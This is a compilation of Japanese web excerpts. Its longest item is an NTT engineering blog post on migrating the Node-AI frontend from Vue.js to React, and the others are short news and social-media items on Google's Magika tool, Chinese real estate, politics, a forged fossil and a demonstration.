Content: 中学は部屋割りも自由行動の班も自分たちで勝手に決めろだったけど、高校はあえて仲良いグループが固まらないような形で学校側が決めてくれたから変なとこ悩まずに済んだな 結局...
Title: 歳を重ねるほど思う

Link: https://engineers.ntt.com/entry/2024/02/19/055601
Content: はじめての方、はじめまして。久しぶりの方、お久しぶりです。 イノベーションセンターの何縫ねの。(@nenoMake)です。 普段の業務ではソフトウェアエンジニアとして Node-AI という WEB アプリケーションの開発をしています。 パブリックな活動としては、好きな言語である C# 関係の OSS 開発や技術ブログの投稿、登壇などをしています。 ですが、今回は C# ではなくフロントエンドのお話をします...!

この記事では今まで Vue.js 2.x で開発されていた Node-AI の WEB フロントを完全に捨て去り、React にリプレイスしたお話をつらつらとしていきます。 まずは前編ということで、リプレイスプロジェクト発足時の課題感からはじめ、プロジェクトの進め方や選定技術などについてお話しします。 後編には内部の設計などのより技術的なお話をしたいと思います。では前編スタート...!

Node-AI とは

Node-AI はノーコードでAIモデルを作成できる WEB アプリケーションです。以下の図のようにカードを直感的につなげるだけで時系列データの前処理からAIモデルの学習・評価までの一連のパイプラインを作成・実行できるようなものとなっています。

各データ処理(例えば正規化やデータ分割など)がそれぞれカードとして表現されており、それを繋げてパイプラインを作成します。 視覚的に処理の流れを追いやすく、データ分析者の(往々にしてカオスな)コードを解読する行為から解放されるため、業務が捗るでしょう。 また複数人での同時作業にも対応しているため、コラボレーションが活性化し、ステークホルダーを巻き込んだ効率的なデータ分析やAIモデル開発ができるようになるはずです。 現在 β 版として公開しているので、気になる方は是非使ってみてください。

今までのフロントエンドの課題

すこし歴史的経緯から。 私は新卒2年目なのですが、その入社より遥か以前、Node-AI の開発プロジェクトが爆誕したのは機械学習エンジニアたちがいろいろ案件を回していく中での課題感からだったそうです。 なのでいざ Node-AI というアプリケーションを開発するぞ！となった時、発案者たちである機械学習エンジニア達がアサインされるのは言うに及ばずなのですが、さてアプリケーションエンジニアないし WEB 系エンジニアはどう調達するか。 課題感が発生したチームには、そのような人材はいなかったそうです。機械学習専門のチームだからそれはそうという感じ。 このような場合、社内から適切な人間を引っ張ってきてどうにか解決するのがベストなわけですが、残念ながらそうはいかなかったそうです。 ではどうするか。そう、外注です。

そんなこんなでプロジェクト発足当初は Node-AI のフロントエンドは完全に外注していたそうです。 発注元にコード書ける人間がいない中で外注するとどうなるかは火を見るよりも明らかで、以下のような状態に陥ってしまいました。

発注側にコードの品質を管理できる人間がいないため、コードが徐々にカオスへ 指示された機能さえ出来てればいい、の積み重ね

コードがカオスになるにつれ、少しの修正に多くの時間と金がかかるように

このような状態が続いたわけですが、とあるタイミングで「全部内製開発するぞ！」という事になり、弊チームの人間がフロントエンドの開発をするようにもなったそうです。 内製開発に倒したはとても良い事だと思うのですが、結局今までのカオスの上に増改築をするような状況となるので、フロントエンドの機能開発に時間がかかるのなんの。

この時、フロントエンドが抱えていた技術的な課題は以下のようなものでした。

問題ある DOM 構造や CSS 手を加えると意図しない箇所の描画が壊れたりする砂上の楼閣

問題あるコンポーネント設計 単一責務になっていなかった 結果として生まれる神コンポーネント 具体的には 3000 行を超える SFC (.vue ファイル) が存在していた むやみに複雑な props と emit のスパゲッティ

厳しい開発体験 Vue.js 2.x の低い TypeScript ビリティ 型が分からず、動かしてみないとデータ構造が分からないケース多数 にも関わらず、デバッガが使えない VSCode の intellisense や Find All References 等の機能が効かない

迫る Vue.js 2.x の EoL

この技術的な課題の結果として、度々ユーザからリクエストを受けるフロントエンドマターな機能が実装できないという問題や、デザイナーと開発者との連携、例えば Figma で提示された CSS が使えない等の問題も生じていました。

という事で、これらすべての問題を解消するため、フロントエンドをリプレイスするプロジェクトが動きました。リファクタリングじゃなくてリプレイスですからね、すべての解消を狙って然るべきでしょう...!

そしてただのリプレイスじゃねぇぞ、ド級のリプレイスだ...! という事で、度々ユーザからリクエストを受けていた機能もこれを機会に実装しちゃうぞ！という形で進める事となりました。 GUI アプリケーションの開発を組んだ事ある開発者の方はいろいろ分かると思いますが、最初から考慮していないと厳しいものはいろいろありますよね。 後から入れるとコストが大爆発するやつ。

リプレイスプロジェクトの進め方

まず前提として、現在のNode-AI はスクラムを用いたアジャイル開発をしていて、開発チームはフロントエンドチーム、バックエンドチーム、インフラチームといったような技術領域での分割をしていません。 フロントエンドはできるがバックエンドは全くできない、あるいはバックエンドはできるがフロントエンドは全く出来ない、みたいなエンジニアは現在では弊チームに存在しません(採用を頑張っている事が伺えますね)。 まぁ、もちろん得手不得手はありますし、専門領域も異なるのですけどね。

そしてこのプロジェクトは主に2つのフェーズが存在しました。 それぞれどのような感じであったかを書いていきます。 予め断っておくと、いわゆる設計工程と開発工程とは異なったものです。

フェーズ1

期間としては 2022年6月～10月 です。

この期間は開発チームから私含めた4人を切り出し、主に以下のような事を行っていました。主には技術的な下地を作っていたといえるでしょう。

既存機能の整理 技術選定のためのサーベイ 不確実性の高い箇所についての設計やプロトタイプ実装 各既存機能の再実装にかかるコストの見積もり

技術選定の内容としては Vue.js 3.x/Nuxt.js, React/Next.js のどちらで行く？から始まり、UI ライブラリは？グラフライブラリは？とかとか。選定技術については後述します。

また技術的に不確実性が高い箇所については、実実装に入る前のこのフェーズで実際に手を動かしていろいろ試していました。 たとえば Node-AI のキャンバス画面 (カードを配置する画面) は素朴に DOM をくみ上げればいいというわけでもないので、その描画をどのように実現するか、具体的には html の <canvas> で行くのか <svg> で行くのかとか、フルスクラッチするかライブラリに乗っかるか等です。 他にも今までのフィードバックから需要が高い事は分かっているが今まで実装できなかった undo/redo や 複数人でのリアルタイム共同編集機能といった、さまざまな要求を実現するための技術的な不確実性を解消していました。 一個人のエンジニアとしては、とりあえず実装してみてそれをベースに開発メンバで頭突き合わせてあーだこーだと議論して、不確実性の解消し、完成度を高めていくというこのフェーズの活動はめちゃくちゃ楽しかったです。

そしてこれらの活動を通じて実装のおおよその感覚をつかみ、フェーズ2にて実装する全ての機能それぞれに実装コストの見積もりました。 とはいえ見積もり自体は大味ですが。

フェーズ2

期間としては 2022年11月～2023年12月 です。

まずはフェーズ1と同じ4人のエンジニアで実装をすすめ、2023年6月ごろから徐々に開発者の人数を増やし、12月にリプレイス完了！といった形です。

このフェーズの開発は Vue.js 2.x の EoL が 2023年12月であったことからも、とにかく開発速度が求められていました。 EoL までには何としてもリリースしたい。 そこでこのプロジェクトでは、これまで行っていた通常のスクラムとは一部異なる進め方をする事にしました。 これまでの進め方では、優先順位の高いプロダクトバックログアイテム（機能など）から順番に、複数の開発者で協力して開発してきました。 この進め方は必然的にチームの中で多くのコミュニケーションが発生するため、それが結果的に「コードをみんなのもの」にし、チームとしてのレジリエンスを高める事に寄与してくれていました。 しかし裏を返せば、コミュニケーションコストがそれなりにかかっているということですから、開発速度を最優先事項に据えた場合、最適ではなくなります。 そこでリプレイスプロジェクトでの開発においては「一人一殺」という標語の下に、特定の機能は特定の人が一気通貫で作るというスタイルで開発を進め、開発速度を高めていきました。 とはいえ当然レビューは行うので、実装者とレビュアーの間でのコードの共有はなされていましたし、誰かが悩んだりした際には随時メンバー間で相談や壁打ちは行っていたため(心理的安全性が確保されていると言えますね...!)、完全に一人しか知らないコード、というのはほぼないと思われます。 なお、インクリメントという名のアウトプットをステークホルダーにお見せしフィードバック貰ってプランニングして...、といったスクラム一般の一連の所作は今まで通りやっていました。

ところで一人一殺という進め方、技術的な視点で見ると、そのやり方で進めると実装取っ散らばらないか？と思ったりもするのではないでしょうか。 それについてはフェーズ1にて一定のレールを敷くことに成功し、基本的にはそれらのレールに沿って実装したため問題になりませんでした。 特に量産が必要なところ、例えばキャンバス上に配置されるカードなどのオブジェクトの操作や、各カード毎(=データ処理や機械学習に必要な処理毎)に対して作る必要があるカード詳細画面などは、それがよく機能していたと感じるところです。 また前述のとおり、2023年6月ごろから追加の開発者がこのプロジェクトに投入されたのですが、投入されたメンバーはいままで Vue.js で開発をしていたため、React には不慣れでした。 しかしながらメンバーそれぞれの React に対するモチベが高く優秀であった事に加え、コード上に一定のレールを敷くことが出来ていたため、スムーズにキャッチアップでき、最終的なゴールまで加速できたのではと思います。

その結果として2023年12月末、Vue.js 2.x の EoL というタイムリミットの前になんとかリリースできました、という感じです。 いやはやよかったよかった。

バックエンドにも手を入れる事を躊躇わない

フロントエンドのリプレイスは既存のフロントエンドの負債を解消する事と、今まで実現できなかった機能を実装する事を主だった目的としていました。 しかしそもそも、なぜ負債の解消をするのでしょうか？それは今後の継続的な機能開発を加速可能な状態にするためです。 せっかくリプレイスしても新機能の追加が大変なものが出来上がったのでは、コストを支払った意味がありません。

そういった視点で考えたとき、既存のフロントエンドが利用しているエンドポイントをそのまま利用する事がそれに寄与するのか？というのはリプレイスプロジェクトを進める上で当然議題にのります。 フロントエンドの実装を進める上でぶつかった既存のエンドポイントに関する課題は以下のようなものでした。

複数のエンドポイントのレスポンスが闇鍋

いくつかのエンドポイントはレスポンスが極めて動的 エンドポイント単位で型を与えるのが困難



これは今後も新たに機能を追加する際、都度闇鍋 JSON に新機能由来のデータが追加され、それをデシリアライズした後に解釈するためのコードを加筆し続ける必要があるという事です。 これは継続的な開発及びバグ防止の観点から避けたいです。 そこでこの課題を解決するべく、バックエンド実装に対して以下の方策をとりました。

新規に実装してもたいしたコストがかからないものについては新規実装

新規実装にコストがかかりそうなものについても新規エンドポイント実装 ただし内部では BFF のような仕事をするレイヤを作成するだけに留め、ロジック自体は既存実装を使いまわす これによりレスポンスを比較的シンプル化 & 強く型付け



もともとフロントエンドのリプレイスプロジェクトですから、コストをあまりかけないようにしました。 このようにバックエンドの実装も修正しながら進められた事は、フロントエンドだけでなくバックエンドも一定以上に書けるエンジニアでプロジェクトを進める事が出来た利点でしょう。

また上記の課題とは別軸に、以下に対応するためにもバックエンド実装は必ず通る道でした。

リプレイスで生まれる新機能向けバックエンド実装 リアルタイム通信系機能 ストレージ節約マイクロサービス



リアルタイム通信に纏わる機能は既存の実装にはほぼ無いものでしたから、必然的に新規実装する事になりました。 また Node-AI のキャンバス上に配置されたカードのデータ処理や機械学習の結果にまつわる生成物がバックエンド上では伴うのですが、フロントの新機能としてキャンバス内操作の undo/redo を実現すると、それらを即座に削除する訳にもいかなくなりました。 つまり定期的に不要になったそれらを片付けるマイクロサービスなどが必要でした。 このようなものもフロントエンドのリプレイスプロジェクトだからといって躊躇わずに実装しました。

選定技術

選定した技術はおおよそ以下のような感じです。

TypeScript

React/Next.js

Redux

Mantine

ECharts

SignalR

Tailwind CSS

Mock Service Worker

Storybook

React Testing Library

Playwright

もともと Vue.js 2.x を用いていた事から、Vue.js 3.x/Nuxt.js と React/Next.js のどちらを使うのかはプロジェクト発足時、当然議題にあがりました。 結果としては React/Next.js を選んでいるのですが、理由としては以下の通り。

TypeScript との親和性

世界的な潮流 Vue.js 3.x が JSX を取り込んだことからも分かる通り。

メンバーのモチベ

個人的には React の「GUI は純粋関数として表現できる」という思想及び単方向データフローである点は極めて有益であると感じ、関数型コンポーネント + hooks 登場以降の React は大好きです。 もちろん実装上は全てのコンポーネントが純粋関数とはいかないのですが、Node-AI の実装では純粋なコンポーネントとそうでないところは徹底して分離する事で、読みやすさと保守性の向上に努めています。

またグラフライブラリには ECharts を利用しています。 Node-AI は時系列データを取り扱うアプリケーションなので、そこそこ大きいデータも問題なく描画できるグラフライブラリを選択する必要があります。 そこで10個弱のグラフライブラリでそれなりのサイズのデータを描画し、パフォーマンスバトルを行いつつ、GUI としての操作感や今後実現したいグラフが描画できるか等を検討しました。 結果的にパフォーマンス的にもグラフ表現の幅も広かった、ECharts を採用しました。

リプレイスを通して得たもの

整理整頓された DOM 構造や CSS

綺麗になったコンポーネント達

TypeScript による徹底した静的な型付け

Storybook による UI カタログ

統一された開発環境

もともと課題になっていた、いわゆる汚いコードというやつは当然ながら全て払拭しました。

上記で「綺麗になったコンポーネント達」というふんわりした事を書いているのですが、ここでは以下のような事を徹底しました、という事です。

単一責務

container と presenter の分離

message と service の分離

イベントハンドラ等の関数名による明示的な意味づけ

上2つについては特にいう事はないでしょう。 多くの人が頭で理解はしていても、なんやかんやで徹底されず、多くのコードではそうなっていないというだけで。

3つめの message と service の分離については、要はデータと処理の分離です。 データ指向プログラミングとも言いますね。 リプレイスされた TypeScript のコードの多くは純粋関数で出来ているため、これは自然と守られます。 とはいえそれが全てではなく、当然 class も使っています。 その場合でも、それらのインスタンスを「状態を持って振る舞うオブジェクト」として用いるのではなく、あくまで「immutable な message と service」といった形で分離し利用する事で、これを徹底してます。

そして最後のイベントハンドラ等の関数名による明示的な意味づけについてですが、これはたとえば useEffect の第一引数に処理をべた書きした無名関数を渡すのではなく、 コンポーネントの外で名前が与えられた関数を定義し、それを useEffect の引数内で用いるといったコードの書き方をしたという事です。 もう少し具体例をだすと onChange のような props があった時、そこに onChangeHandler みたいな情報量ゼロな関数オブジェクトを渡すのではなく、たとえば validateXxx のような何をする事を意図しているのか瞬時に判別できる名前のついた関数オブジェクトを渡すようにする、とかです。 こういった命名を積み重ねていくことで、初見でも渡されている関数が何を意図しているのかがすぐに分かります。 また同時に名前がついていることから、別の処理を追加しようとした際に心理的な抵抗感が生まれるため、1つのメソッドにさまざまな処理が追加され、結果的に単一責務からかけ離れた多重責務になってしまうといった状況が発生する事を防げます。 ラムダをべた書きしたり、情報量ゼロの名前を関数につけてしまった場合に発生しがちな複数の責務が押し寄せてくる事象も、小さな命名の積み重ねで防げると私は考えています。

そしてもう1つ、地味に大事な収穫の1つとして、統一された開発環境を提供できるようになりました。 現代の TypeScript によるフロントエンド開発する上で VSCode 上での開発体験は極めて重要です。 IntelliSense によるコード補間、Find All References や Go to Definition といったシンボルでコードを飛び回る機能、そしてデバッガ。 これらは生産性にダイレクトに響いてきます。せっかくゼロベースでやるのであれば、そのあたりは整備して全開発者にばら撒いてしまった方がなにかと良いです。 各々で開発環境をカスタムするのは止めませんが、標準的な開発環境は揃えた方が何かと幸せ。 という事で dev container で必要な設定や拡張が一式揃った開発環境を提供しています。 今までは標準的にはこれ使ってね、みたいのも無く、VSCode の便利機能を活用しきれていないケースが多々あったのですが、これにより全ての開発者はコストゼロで生産性の高い環境を手に入れられるようになりました。

まとめ

Node-AI のフロントエンドは Vue.js 2.x を捨て、React/Next.js に移行を果たしました。 この記事では主にプロジェクトの進め方や技術選定、結果として得られたものについてお話しました。 私個人としては入社してから殆どこのプロジェクトに付きっ切りでしたので、いろいろやり切った感があります。 頑張った偉い。 とはいえ React にリプレイスされた Node-AI のフロントエンドはこれで終わりではなく、むしろこれからの機能追加がドシドシ行われるフェーズこそが本番であり、設計したものの真価が問われるので、気が引き締まりますね。

そして EoL を迎えた Vue.js 2.x を捨てなければならない案件は各所で発生している問題かと思いますので、この記事が読者の皆さまの役に立てば幸いです。

後編予告

前編であるこの記事では、主にプロジェクトの進め方等について書いていきました。後編ではもうちょい技術よりのお話をする予定です。今のところ、以下の内容の設計だったり開発フロー等についてを予定しています。それではまた後編で会いましょう...!
Title: フロントエンドを Vue.js から React にリプレイスしたお話 (前編) - NTT Communications Engineers' Blog

Link: https://www.publickey1.jp/blog/24/googleaimagika.html
Content: Googleは、AIを用いることでファイルの種類を高速かつ正確に判別できるツール「Magika」をオープンソースで公開したと発表しました。

Magikaは、あるファイルの中味が何なのか、記述されたプログラミング言語の種類、動画や画像、音声などのフォーマットの種類、ExcelやWord、PDFなどのオフィス系ソフトウェアの種類、OSの実行形式バイナリなどの種類を瞬時に判別してくれます。

下記はコマンドラインとしてMagikaを実行した例で、フォルダ内のファイルの種類を出力しています。

特別に最適化された1MBのモデルでを用いて推論を実行

Magikaはファイルの判別に、Kerasを用いて特別に最適化されたディープラーニングによる、わずか1MBのモデルを用いていると説明されています。

このモデルは推論エンジンのOnnx上で実行されています。実行速度はGPUを用いずCPU上で処理されたとしても数ミリ秒程度とのこと。

GoogleはこのMagikaを100以上のファイルタイプを網羅する1Mファイルベンチマークで評価し、他の既存ツールより高い精度で判別を実行し、なおかつ他を約20%上回る高速度を実現したことも発表しています。

なぜファイルの中味を見て判別する必要があるのか？

一般にファイルの種類は拡張子によって示されますが、現実にはファイルの拡張子がつねに正しいとは限らないため、ファイルの内容を見て種類を判別する処理はさまざまなソフトウェアの内部で行われています。

例えば、コードエディタにおいてシンタックスハイライトの設定を行うためにプログラミング言語の種類を判別することや、業務アプリケーションが特定の種類のファイル以外は読み込まないような判別をすることなどが挙げられます。

特に重要とされているのはセキュリティの分野です。拡張子を偽ってユーザーにファイルを開かせようとするマルウェアに対処するために、拡張子ではなくファイルの内容から種類を適切に判断し、ファイルの種類に合わせて用意されたスキャナーによる安全性評価は欠かせません。

GoogleはMagikaをGmailやGoogle Driveなどの何百万ものファイル処理にすでに活用しており、これまで同社が利用していたルールによるファイル判別と比べて50％の精度向上を実現でき、より精度の高いスキャンが可能になったと説明しています。
Title: Google、AIでファイルの種類を高速正確に判別できる「Magika」をオープンソースで公開

Link: https://togetter.com/li/2317226
Content: 日本ならではのスパイスを使った料理出してくれそう

まとめ 「日本料理がおいしいの日本人が慣れてるだけ」「日本料理は切っただけ煮ただけ焼いただけでスパイスが貧弱」に反論が集まった話 なるほど 154415 pv 365 users
Title: 「日本料理は"料理"ではないんだよな」「食材を切っただけ、煮ただけ、焼いただけ」←全部『美味しんぼ』のヴィランが言いそうな台詞で好き過ぎる

Link: https://jbpress.ismedia.jp/articles/-/79481
Content: 経営破綻した不動産開発大手、中国恒大集団が江蘇省南京市で開発したマンション群（資料写真、2023年12月4日、写真：CFoto/アフロ） ギャラリーページへ

（川島 博之：ベトナム・ビングループ、Martial Research & Management 主席経済顧問）

中国における不動産バブル崩壊が誰の目にも明らかになった。ただ、そのバブルがどの程度のものなのか、崩壊して何が起こるのか、もう一つ明確ではない。その最大の原因は、中国政府が発表するデータが信用できないからだ。折に触れて内外のマスコミが報じるデータからも、全体像を掴むことはできない。ここではフェルミ推定（実際に調査することが難しい数量を論理的な推論によって概算すること）の手法を借りて、中国のバブル崩壊とはなんなのか考えてみたい。

2024年2月8日、中国株式市場の終了を見守る投資家たち（資料写真、写真：CFoto/アフロ） ギャラリーページへ

中国にある住宅の総数は？

中国の人口は14億人、実際にはこれより少ないと言われるが、ここでは概算を行うのでこの数字を採用する。14億人は都市戸籍を持つ6億人と、農民戸籍の8億人に明確に分かれている。バブルに踊ったのは都市戸籍を持つ6億人だけだ。

都市部の平均世帯人数は3人だから、都市では2億戸の住宅に人が住んでいる。また農村の平均世帯人数は4人とされるから、2億戸の住宅に人が住んでいる。中国で人が住んでいる住宅の総数は4億戸ということになる。

農民戸籍である8億人の中で2億人ほどが都市に住んでいる。彼らは流動人口であり「農民工」と呼ばれており、その多くは雇用者側が用意した寮に住んでいる。不景気になれば農村に帰る。農村の家は広いので、息子や娘が戻ってきても住む場所には困らない。
Title: 「日本に行って爆買い」はもうできない？ 数値化して分かったバブル崩壊の実態と中国人を待ち受ける悲惨な現実 フェルミ推定で考える、都市に住む“平均的家庭”に何が起こるのか？ | JBpress (ジェイビープレス)

Link: https://togetter.com/li/2317293
Content: そういうの、ある
Title: ベッドに寝てスマホとか見ながら物も置けるテーブルあったらよくない？→各社さんから最高アイテム出てるから見て

Link: https://togetter.com/li/2317232
Content: 日比谷線で電動車椅子の方が単独降車してドアが破損してしまったという話

車椅子利用者が「何がダメだったのか」に言及

知らなかった
Title: 「電動車椅子の人が日比谷線のドアレールを破壊した」という話に対し、車椅子利用者が「なぜスロープが必要なのか」を解説→最近は単独乗車できる車両も

Link: https://togetter.com/li/2317371
Content: 休日に妻が出かけると、僕が駅まで迎えにゆく。これが前提。 週末、妻は久々に学生時代に友人らと一泊旅行に行った。妻がいなくて寂しいうちの猫は、上記の学習をしていて、 妻がいない ↓ 俺が外に出ると妻と戻る ↓ だから俺を外に出せば妻が戻る と考えたらしく、朝3時に追い出されかけた。
Title: 「あの人間が帰らない…」寂しくなった猫さんが習慣から推理してもう1人の人間を追い出しにかかる午前3時

Link: https://togetter.com/li/2317271
Content: えっ、運転して良いの？ でも、800kmって、途中1回給油したら着く案外近いよね。 ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ ※ 実際の私は、軽トラで北九州⇨新潟周りの福島県郡山市（研修）⇨関東経由の北九州3200kmを40時間ほど0泊3日で行く様な変人です。 写真は、その際に撮影した東京スカイツリーと軽トラ^_^、

拡大
Title: 旅行だと言われ飛行機で高知まで来たら、何故か軽トラがあって「じゃ今からコレを800km運転して家まで帰るから」って彼氏に言われた

Link: https://www.news-postseven.com/archives/20240219_1942428.html?DETAIL
Content: 女性ジャーナリストの伊藤詩織さんを侮蔑するX（旧ツイッター）の投稿に「いいね！」を押したとして、2月8日に最高裁で名誉毀損が認定され、55万円の賠償命令が確定した自民党の杉田水脈・衆院議員（56）。安倍派（清和会）きっての“炎上女王”として数々の騒動を起こしてきた杉田氏は、政界を揺るがすパーティー券の裏金問題でも、派閥からの収入1564万円を記載していなかったとして政治資金収支報告書を訂正したばかり。

だが、彼女の「政治とカネ」の疑いはこれだけではなかった。ジャーナリストの大島佑介氏がレポートする。

＊ ＊ ＊

兵庫県宝塚市伊孑志。日本歌劇の聖地・宝塚大劇場周縁の人口約5000人の住宅街の一角に、杉田氏の政治団体『杉田水脈 なでしこの会』の事務所は所在している。

1階部分がテナント、2、3階部分が住居となっている杉田氏の事務所所在地のマンションを訪ねると、テナント部分に所在するはずの事務所には杉田氏のポスターやのぼりはなく、外観からここが彼女の事務所だとは識別できない。

その代わりに、テナントの扉には不動産・コンサルティング業を営む「N社」のステッカーが大きく貼られている。近隣住民が言う。

「以前はあそこに杉田さんのポスターが貼られ、のぼりも立っていましたが、ここ数年間は見たことがありません。すでに事務所は引っ越して、どこかの会社が入っているのだと思っていました」

2012年に兵庫6区で日本維新の会から衆議院選挙に出馬した杉田氏は、比例復活で初当選。その後、2014年に次世代の党に移党し、同じ兵庫6区から出馬するも、最下位で落選。以降は2017年に自民党から比例中国ブロックで出馬し再選を果たすまで、宝塚市に拠点を置きつつN社の取締役も務めていた。事情を知る関係者の話。

「落選中の杉田さんは知人のA氏とともに2015年にN社（本社・大阪）を立ち上げ、自身も取締役に就任。設立時にはSNSで〈会社を立ち上げました〉と告知していた。なでしこの会の事務所と同じ部屋にN社の支社を置き、講演や著述活動を行ない、役員報酬も受け取っていました」

この証言を裏付けるように、2018年の杉田氏の資産報告書には、N社からの役員報酬の発生が見て取れる。

「ですが再選後の2018年3月に杉田さんはN社の取締役を辞任。以降は自民党中国比例第二支部に拠点を移しました。ただ、宝塚市の事務所を閉めたわけではなく、N社が彼女の政治団体『なでしこの会』の事務所業務もしているそうです」（同前）
Title: 【政治とカネ問題】杉田水脈・衆院議員「身内企業への支出」隠蔽疑惑　自身が役員を務めたコンサル会社への“業務委託費”が消えていた

Link: https://www.bengo4.com/c_1009/n_17213/
Content: 会社の飲み会で、幹事が飲食代をまとめてクレジットカードで支払うケースがあります。ただ、社員個人のクレジットカードで支払った場合、その人にポイントがついてしまいます。

幹事を無償で引き受けているのだから、ポイントくらいいいんじゃないか、という意見もあります。

一方で、エックス（旧ツイッター）で、幹事をした人が上司から「それってクレカポイントの横領だよな」と指摘を受けたという投稿がありました。

弁護士ドットコムにも、同様の相談が寄せられています。個人のクレジットカードで支払ってポイントを得た場合は「横領」になってしまうのでしょうか。半田望弁護士に聞きました。

●「事前に会社に確認を」

――どうしても、個人のクレジットカードで支払う場面はあると思いますが、どう位置付けられるのでしょうか。エックスのユーザーは、上司から「横領」という指摘を受けてしまっていますが…。

会社の支払いを個人のクレジットカードでおこなっても横領などの犯罪にはあたりませんが、会社によっては、社内規則で、個人のクレジットカードで決済したり、それによってポイントを貯めたりすることを禁止しているところがあります。そのような場合、ポイントをためることは、会社との関係で問題になることは言うまでもありません。

――では、明確に禁止していない場合はどうでしょうか。

あくまで私見ですが、キャッシュレス決済のキャッシュバックと異なり、どこの店舗でも使えるというわけではなく、また受け取ったポイントやマイルを現金相当額に換算した場合の金額もはっきりしない場合もあることから、マイルやポイントは必ずしも現金と同視することはできず、明確に禁止されていない限り「グレーな状態である」と考えています。

ただし、後々問題になる可能性はありますので、事前に会社に確認をしておいたほうがいいでしょう。
Title: 会社の飲み会で幹事がクレカで払ったら、上司が「ポイントは横領」と指摘…法的にはどうなる？ - 弁護士ドットコムニュース

Link: https://anond.hatelabo.jp/20240219151955
Content: オンライン収録だと「はじめまして」と話していても、実際に対面してるとは限らないじゃん 現場などで対面したことがあっても、ちゃんと話すのが「はじめまして」という事もあるじ...
Title: 「初対面」が死語になる日が近い

Link: https://gigazine.net/news/20240219-fossil-forged-soft-tissues-tridentinosaurus-antiquus/
Content: 2024年02月19日 12時35分 サイエンス

皮膚が残る2億8000万年前の化石がねつ造された偽物だったことが判明



うろこ状の皮膚などの軟組織の痕跡を残し、恐竜出現前の初期の爬虫(はちゅう)類の姿を現代に伝える大変貴重な標本とされてきた古生物の化石が、「岩を掘ってから焼いた骨で作った塗料を塗ったねつ造品」だということが判明しました。保存状態はよくないものの、塗料の下の骨格の一部は本物の可能性があることから、科学者らは最新技術を使った化石の分析に望みをかけています。



Forged soft tissues revealed in the oldest fossil reptile from the early Permian of the Alps - Rossi - 2024 - Palaeontology - Wiley Online Library

https://onlinelibrary.wiley.com/doi/10.1111/pala.12690



Latest News and Views from University College Cork

https://www.ucc.ie/en/news/2024/mystery-solved-the-oldest-fossil-reptile-from-the-alps-is-an-historical-forgery.html



Ancient Fossil That Baffled Scientists For Decades Finally Reveals Its True Identity : ScienceAlert

https://www.sciencealert.com/ancient-fossil-that-baffled-scientists-for-decades-finally-reveals-its-true-identity



Only part of rare 280 million-year-old fossil is real — the rest is mostly paint | Live Science

https://www.livescience.com/animals/extinct-species/only-part-of-rare-280-million-year-old-fossil-is-real-the-rest-is-mostly-paint



今回ねつ造された標本だということが判明したのは、ペルム紀に生息していた「トリデンティノサウルス・アンティクウス(Tridentinosaurus antiquus)」という古生物の化石です。1931年にアルプス山脈で発見されたこの標本には、体の輪郭や手足の形がくっきりと残っています。





特殊な保存状態にあることから、トリデンティノサウルスの化石は書籍でたびたび紹介されてきましたが、現代の技術による詳細な分析は行われてこなかったため、この化石がどの系統に属する爬虫類のものなのかは判然としていませんでした。



この化石について、ユニバーシティ・カレッジ・コークの古生物学のヴァレンティナ・ロッシ氏は「軟組織の化石は珍しく、化石とした発見されれば体色などの外見や内部の生理学的・解剖学的構造など、重要な生物学的情報が明らかになります。そして、私たちの疑問の答えはすべて目の前にありました。ですから、私たちはこの化石標本を詳細に調査し、なんとしてもその秘密を明らかにしなければならなかったのです。私たちが知りたくなかったであろう事実も含めて」と話しています。



さっそくトリデンティノサウルスの化石の詳細な分析に着手したロッシ氏らの研究チームは、まず紫外線スキャンによる予備調査を行いました。その結果、トリデンティノサウルスの化石全体がコーティング材で処理されていたことがわかりました。





標本をワニスやラッカーでコーティングするのは、昔の化石調査では標準的な手法で、現代でも博物館の展示品として化石を保存する時などに行われることがあります。そこで、研究チームはコーティング層の下にまだ良好な状態で軟組織が残っていることを期待して、走査型電子顕微鏡エネルギー分散型X線分光法(SEM-EDX)、マイクロX線回折(μ-XRD)、ラマン分光法、減衰全反射フーリエ変換赤外分光法(ATR-FTIR)などの技術を駆使して、化石から採取したサンプルを分析しました。



その結果、コーティングの下にあったのは動物の骨を焦がして作られた合成顔料で、歴史的な絵画などにもよく使われる塗料である「ボーンブラック」だということが判明しました。



ただし、この化石は完全な偽物というわけではなく、後肢の骨、特に大腿(だいたい)骨は、保存状態が悪いものの本物だと考えられています。また、さらなる分析により背中に相当すると思われる部分に皮骨板という、ワニなどにもあるような小さな骨状の鱗があることも判明しました。





こうした点から、この標本を作った人物は偽物の化石をでっち上げようとしたのではなく、後肢の骨を発見してから、残りの部分を強調するためにトカゲの形に掘ってから色を塗ったのではないかと、研究チームは推測しています。



今回の研究について、ロッシ氏は「話の流れが完全に変わってしまったので、少し悲しい気持ちになりましたが、私たちはまだこの爬虫類のような生き物から目を離せずにいます」と話しました。
Title: 皮膚が残る2億8000万年前の化石がねつ造された偽物だったことが判明

Link: https://togetter.com/li/2317233
Content: 人体ってこういう風に環境に適応するんだなぁ

首ってこんなに膨らむんだ！？
Title: NHKの吹奏楽コンサートを観てたらオーボエ奏者の人、吹いてる時に首が膨らんでたけどそんな事あり得るんだ…「なにこれ首どうなってるんだ」

Link: https://www.asahi.com/articles/ASS2M43HQS2MUTIL00D.html
Content: [PR]

虐待や性被害などにあった女性を支援する一般社団法人「Colabo（コラボ）」への中傷をブログに書き込んだとして、警視庁は自称ユーチューバーの男性（41）を名誉毀損（きそん）の疑いで書類送検した。検察に起訴の判断を委ねる「相当処分」の意見を付けたという。

送検は15日付。捜査関係者によると、男性は「暇空茜」の名前で活動している。送検容疑は2022年9月、ブログサイトnoteに「10代の女の子をタコ部屋に住まわせて生活保護を受給させ、毎月一人6万5千円ずつ徴収している」などと書いた記事を投稿し、法人や代表の仁藤夢乃さんの名誉を傷つけたというもの。

Colabo側が告訴し、警視庁が昨年11月に受理していた。男性は「Colaboのホームページを見て自分の考えを論評しただけだ」などと供述したという。（遠藤美波）
Title: Colaboをブログで中傷の疑い、「暇空茜」名乗る男性を書類送検：朝日新聞デジタル

Link: https://nou-yunyun.hatenablog.com/entry/2024/02/19/120000
Content: ２月18日に蕨において日の丸街宣倶楽部という団体が以下の様なデモを行った。



https://twitter.com/hinomaruspeech2/status/1750509069344141343

このデモに対してSNS上で「#0218蕨ヘイトデモを止めろ」 というハッシュタグが用いられるなど、現地でカウンター活動が行われ、そして次の様な動画がアップロードされる。

音声を書き起こすとするならば、

~18秒ごろはブーイング

18~26秒ごろは「恥を知れ」

27秒ごろからクルド人と思われる男性が、

病院に行け

病院に行け

精神病院に行けレイシスト

